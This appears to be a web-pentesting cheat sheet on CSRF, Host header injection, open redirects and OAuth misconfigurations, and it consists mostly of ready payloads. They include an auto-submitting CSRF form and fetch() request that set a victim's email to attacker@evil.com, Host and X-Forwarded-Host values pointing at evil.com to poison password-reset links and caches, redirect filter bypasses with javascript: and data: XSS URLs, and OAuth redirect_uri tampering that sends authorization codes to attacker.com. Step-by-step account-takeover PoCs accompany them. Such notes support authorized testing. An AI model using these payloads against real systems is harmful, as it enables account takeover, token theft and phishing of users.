# CSRF - Cross-Site Request Forgery

## What Is It
Trick authenticated user's browser into making unwanted requests.

## Features / Where to Find
- State-changing POST requests (change email, password, transfer money)
- Forms without CSRF tokens
- JSON APIs using cookies for auth
- Profile update endpoints
- Password change without old password

## Actions / Attack Techniques

### Basic CSRF PoC
```html
<html>
<body onload="document.forms[0].submit()">
<form action="https://target.com/api/user/email" method="POST">
  <input type="hidden" name="email" value="attacker@evil.com"/>
</form>
</body>
</html>
```

### CSRF Token Bypass Techniques
```
1. Remove the token entirely → does it work?
2. Use a random value → does server validate?
3. Use another user's valid token → is it tied to session?
4. Change POST to GET → GET /change-email?email=attacker@evil.com
5. Change Content-Type to text/plain → bypass CORS preflight
```

### JSON CSRF
```html
<script>
fetch('https://target.com/api/settings', {
  method: 'POST',
  credentials: 'include',
  headers: {'Content-Type': 'application/json'},
  body: JSON.stringify({email: 'attacker@evil.com'})
})
</script>
```

### SameSite Cookie Bypass
```
# If SameSite=Lax → POST requests blocked but GET might work
# If SameSite=None → vulnerable to CSRF
# If no SameSite attribute → check browser defaults
```

## Threat Model
- Change victim's email/password → account takeover
- Transfer money on victim's behalf
- Admin CSRF → privilege escalation

## PoC
```
1. Create HTML file with hidden form
2. Send link to victim
3. Victim clicks → browser sends authenticated request
4. Action performed on victim's account
```

---

# Host Header Injection

## What Is It
Manipulate Host header → affect application behavior.

## Features / Where to Find
- Password reset functionality
- Email generation with links
- Virtual hosting setups
- Cache poisoning scenarios
- Server-side redirects

## Actions / Attack Techniques

### Password Reset Poisoning
```http
POST /forgot-password HTTP/1.1
Host: evil.com
# Server generates: http://evil.com/reset?token=xxx
# Victim clicks link → token sent to attacker
```

### Host Header Variations
```http
Host: evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
X-HTTP-Host-Override: evil.com
Forwarded: host=evil.com
```

### Cache Poisoning via Host
```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com
# If cached → all users get redirected to evil.com
```

### SSRF via Host Header
```http
GET /api/internal HTTP/1.1
Host: 127.0.0.1
```

## PoC
```
1. Trigger password reset for victim@target.com
2. Intercept in Burp
3. Change Host: to attacker.com
4. Forward request
5. Check attacker.com server for incoming request with reset token
```

---

# Open Redirect

## What Is It
Application redirects to attacker-controlled URL.

## Features / Where to Find
- `?redirect=`, `?next=`, `?url=`, `?goto=`, `?return=`
- `?returnUrl=`, `?continue=`, `?dest=`, `?destination=`
- OAuth callback parameters
- Login/logout redirects
- 404 page redirects

## Actions / Attack Techniques

### Basic Payloads
```
?redirect=https://evil.com
?next=//evil.com
?url=https://evil.com
?goto=https://evil.com/
?redirect=\evil.com
?redirect=//evil.com/%2F..
```

### Filter Bypass
```
# Protocol bypass
?redirect=javascript:alert(1)
?redirect=data:text/html,<script>alert(1)</script>

# Whitelisted domain bypass
?redirect=https://target.com.evil.com
?redirect=https://evil.com?target.com
?redirect=https://evil.com#target.com
?redirect=https://target.com@evil.com

# Encoding
?redirect=%68%74%74%70%73%3A%2F%2Fevil.com
?redirect=https:%2F%2Fevil.com
```

### Open Redirect → OAuth Token Theft Chain
```
1. Find OAuth flow: /auth?redirect_uri=https://target.com/callback
2. Find open redirect on target.com: /redirect?url=
3. Chain: redirect_uri=https://target.com/redirect?url=https://evil.com
4. Victim authorizes → token sent to evil.com
```

## Threat Model
- Phishing attacks (trusted domain redirects to evil)
- OAuth token theft via chaining
- XSS if redirect rendered in page (javascript:)

---

# OAuth Misconfigurations

## What Is It
Flaws in OAuth 2.0 implementation → account takeover.

## Features / Where to Find
- Login with Google/Facebook/GitHub buttons
- API authorization flows
- Third-party integrations
- SSO implementations

## Actions / Attack Techniques

### 1. Open Redirect in redirect_uri
```
# Original
/auth?client_id=APP&redirect_uri=https://target.com/callback

# Attack - if not validated strictly
/auth?client_id=APP&redirect_uri=https://target.com/redirect?url=https://evil.com
/auth?client_id=APP&redirect_uri=https://evil.com
/auth?client_id=APP&redirect_uri=https://target.com.evil.com/callback
```

### 2. Missing State Parameter → CSRF on OAuth
```
# No state parameter = no CSRF protection
# Attacker initiates OAuth → gets authorization URL
# Trick victim into visiting URL
# Attacker's account linked to victim
```

### 3. Authorization Code Reuse
```
# Get authorization code
# Use it → server should invalidate it
# Try using same code again → if works = vulnerable
```

### 4. Token Leakage in Referer
```
# If redirect_uri has token in fragment/query:
https://target.com/callback?code=AUTH_CODE
# Page loads 3rd party resources → Referer header leaks code
```

### 5. Scope Manipulation
```
# Original scope
scope=email profile

# Attack - add privileged scopes
scope=email profile admin read:all
```

### 6. Account Takeover via Email Mismatch
```
1. Register with attacker@gmail.com on target
2. Login with OAuth using victim@gmail.com (if email not verified)
3. OAuth links to wrong account
```

## PoC: OAuth Account Takeover
```
1. Find OAuth login with "Login with Google"
2. Intercept OAuth request in Burp
3. Modify redirect_uri to attacker.com
4. Get victim to click "Login with Google" link
5. Auth code sent to attacker.com
6. Exchange code for access token
7. Access victim's account
```

## Tools
```bash
# Manual testing with Burp Suite
# Intercept all OAuth requests
# Test each parameter

# oauth-tester
python3 oauth_tester.py --url https://target.com --client-id APP_ID
```
